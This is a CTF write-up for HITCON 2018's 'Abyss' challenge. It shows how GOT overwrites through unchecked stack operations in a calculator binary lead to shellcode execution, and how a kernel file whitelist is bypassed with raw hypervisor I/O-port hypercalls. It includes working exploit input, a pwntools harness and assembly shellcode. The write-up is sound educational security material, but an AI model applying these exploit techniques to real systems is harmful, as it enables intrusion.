# HITCON 2018 - Abyss

>The Edge of the Abyss
>`nc 35.200.23.198 31733`
>[abyss-09ca5eaf281f657a90cab1803f81bdd9.tar.gz](https://s3-ap-northeast-1.amazonaws.com/hitcon2018qual/abyss-09ca5eaf281f657a90cab1803f81bdd9.tar.gz)

For this challenge we were provided with an archive containing various files, including 3 flags, a hypervisor binary, a kernel binary and a user binary, with instructions to run the system with `./hypervisor.elf kernel.bin ld.so.2 ./user.elf`.  

Given there were challenges Abyss I, II and III, I immediately assumed that we would have to pwn each binary in turn, starting from `user.elf`.

# System Overview
Before I started looking at pwning `user.elf`, I spent some time reversing all of the binaries to better understand how it all fit together. 

The main job of `hypervisor.elf` is to create a KVM virtual machine via the KVM API (`/dev/kvm`), and then service any hypercalls made by the VM.

Interestingly when the hypervisor sets up the control registers of the VM, the `NXE` bit is not set in `EFER`, which means NX is disabled within the VM.  This was an exciting discovery as it meant that if we could control the instruction pointer within the VM, then we could just jump to our shellcode in memory, massively simplifying our exploitation process.

The hypervisor also opens `kernel.bin` and copies the code into address 0 of the VM, before starting execution of the VM at this address.

The kernel then runs `ld.so.2 ./user.elf` which loads `user.elf` and executes it.

`user.elf` is essentially a reverse polish notation calculator (although you can't easily provide two operands for a given operator, e.g. `2 3 +`, but that doesn't matter), which internally uses an evaluation stack to push and pop operands to/from. Some of the operations it supports are `add`, `sub`, `swap`, and `rot`.

# Part 1 - I - 230pts
 The first thing we needed to do was find a vulnerability in `user.elf`. Looking over the code I soon noticed an off-by-one null byte overflow with the `scanf` which reads the input. The `scanf` uses the format string `%1024s`, which reads a string up to 1024 bytes long, and then a null byte is added. The input buffer was only 1024 bytes long, meaning the null byte overflowed into a loop index, however this loop index is initialised to 0 before use anyway, so this was useless.

Next I noticed that both `swap` and `rot` move items around on the evaluation stack without checking the bounds of the evaluation stack pointer. Conveniently the eval stack pointer is positioned directly before the first item in the evaluation stack array. Therefore if the eval stack pointer was at `empty1`, you could use the swap operator (`\`) to swap the top two stack items, i.e. the eval stack pointer with `item0`, which you control. Now the evaluation stack is actually pointing to wherever you want it to and by pushing values to it you can write at your desired location.
```
[eval stack ptr] [ [item0] [empty1] ... ]
                             ^-- eval stack ptr
       ^-- swapped --^
```

![Evaluation stack .bss layout](/2018/2018_10_20_HITCON/abyss/images/eval_stack_ptr.png)

Thankfully `user.elf` was partial RELRO, meaning we could overwrite a GOT entry with the above technique. The plan was to write a GOT entry with the address of our shellcode (which we put at the end of the input buffer in `.bss`). However, the binary is PIE and there were no leaks, so we had to do some gymnastics with the GOT entries to get a pointer to our shellcode. I did this by adding an offset to a known pointer (unresolved `write` entry which pointed into the PLT) and then swapping DWORDs along until I swapped the low DWORD of the unreslved `printf` entry with our adjusted low DWORD, to form a pointer which pointed to our shellcode. We then triggered `printf` with the  `writed` command (`.`), which jumped to our shellcode.

The input string I used which overwrote the GOT address to point to the input buffer was `4294967268\2107670+a\31337\31337\31337\.`

The harness I used for my exploit was:
```python
import sys
from pwn import *

LOCAL = False

if LOCAL:
    t = process('./hypervisor.elf kernel.bin ld.so.2 ./user.elf'.split())
else:
    t = remote('35.200.23.198', 31733)

with open(sys.argv[1]) as f:
    exploit = f.read()

t.sendline(exploit)
t.recvuntil('hitcon')
flag = 'hitcon' + t.recvuntil('}')

log.info(flag)
```
   And my shellcode (`nasm part1.asm -o part1`):
```nasm
; part1.asm

BITS 64

db '4294967268\2107670+a\31337\31337\31337\.'
times 20 nop

; Open "flag"
push   0x67616c66
push   0x2
pop    rax
mov    rdi,rsp
xor    rsi, rsi
syscall

; Read contents onto stack
mov    r9,rax
xor    rax,rax
mov    rdi,r9
mov    rsi,rsp
xor    rdx,rdx
mov    dl,0x40
syscall

; Write contents to stdout
xor    rax,rax
inc    al
xor    rdi,rdi
inc    rdi
mov    rsi,rsp
xor    rdx,rdx
mov    dl,0x40
syscall

jmp $
```

# Part 2 - II - 292pts
Now we had shellcode execution in the `user.elf` we needed to get the contents of the `flag2` file. Interestingly just changing our shellcode above to try and open the `flag2` file failed. After reversing `kernel.bin` it became clear that there was a file whitelist being enforced by the kernel on the `open` syscall, which included  `flag` but not `flag2`, therefore our attempts to open it were failing.

The kernel communicates with the hypervisor via writing to I/O ports. The exact I/O port number written to determines which function to call in the hypervisor. These port values were defined as `0x8000 + syscall number`. So by writing to port `0x8002` in the VM with `out dx, eax`, where `eax` points to the array of arguments for the syscall, the hypervisor will perform this `open` operation for us and return the result (which we can read with `in eax, dx`). 

![Hypervisor run loop](/2018/2018_10_20_HITCON/abyss/images/run_loop.png)

My teammate then suggested that maybe we could just write to the I/O ports directly using the `in` and `out` instructions, and therefore completely bypass the kernel and communicate with the hypervisor directly. To my surprise we actually had the required privileges to write to these I/O ports and were able to trigger the handlers in the hypervisor. So now all we had to do was get the hypervisor to do the opening of `flag2` for us, and then we could read and write out the contents of the file as before.

![Hypervisor dispatch function](/2018/2018_10_20_HITCON/abyss/images/handle_hypercall.png)

The issue here is that the hypervisor expects pointers into kernel memory for hypercall arguments, therefore blindly passing pointers from the `user.elf` address space didn't make sense to the hypervisor, and promptly crashed it.

So now we needed to figure out a way to leak a kernel address and get the `flag2` string mapped into kernel memory at a location we knew/could calculate.

Reversing some more we noticed that when the kernel handles the syscalls it would copy any string arguments into kernel memory before using them, which is what it does in the case of `open`. Interestingly the kernel memory which is allocated for the string in `open` isn't freed if the filename fails the whitelist check. Therefore all we needed to do to get `flag2` into kernel memory was to try and open it, the file name would then be copied into kernel memory, fail the whitelist check and stay there at a fixed location.

As we didn't have a debugger set up on the VM it wasn't immediately obvious how to find the address of the string, especially without leaks. But then we realised we could break on the hypercalls in the hypervisor and just examine the pointer which was passed. Amazingly this was a constant of `0x204380`. So now we could ask the hypervisor to open a file directly and pass a valid pointer to the filename in kernel memory.

The final shellcode to do this was:

```nasm 
; part2.asm

BITS 64

db '4294967268\2107670+a\31337\31337\31337\.'
times 20 nop

; Create string flag2 and attempt to open it
mov rax, 0x101010101010101
push rax
mov rax, 0x101013366606d67
xor [rsp], rax
xor rax, rax
mov al, 2
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
syscall

; "flag2" is now in kernel memory at 0x204380

; Use IO port to open the file with hypervisor
xor rdx, rdx
xor rcx, rcx
mov dx, 0x4444
mov cx, 0xc444
xor rdx, rcx
mov rax, 0x101010101010101
push rax
mov rax, 0x101010101214281
xor [rsp], rax
pop rax
out dx, eax

; Read the flag onto the stack
xor rax, rax
xor rdi, rdi
mov dil, 3
mov rsi, rsp
xor rdx, rdx
mov dl, 64
syscall

; Write the file to stdout
xor rax, rax
inc rax
xor rdi, rdi
inc rdi
mov rsi, rsp
xor rdx, rdx
mov dl, 64
syscall

jmp $+0
```
(I forgot the shellcode didn't have to be null free, hence the extra xoring)

```bash
user@pwn:~/abyss$ sudo python harness.py part1
[+] Opening connection to 35.200.23.198 on port 31733: Done
[*] hitcon{Go_ahead,_traveler,_and_get_ready_for_deeper_fear.}
[*] Closed connection to 35.200.23.198 port 31733

user@pwn:~/abyss$ sudo python harness.py part2
[+] Opening connection to 35.200.23.198 on port 31733: Done
[*] hitcon{take_out_all_memory,_take_away_your_soul}
[*] Closed connection to 35.200.23.198 port 31733
```

# Conclusion
Overall I really enjoyed this challenge and, as always, learnt a lot in the process. I would have loved to get stuck into the third part a bit more but we were pretty low on time after the previous two, so hopefully there'll be some nice writeups. I also think it's about time I learnt how to debug a KVM virtual machine...

Thanks to Retr0id who worked on this with me and thanks to the HITCON organisers for a great CTF!
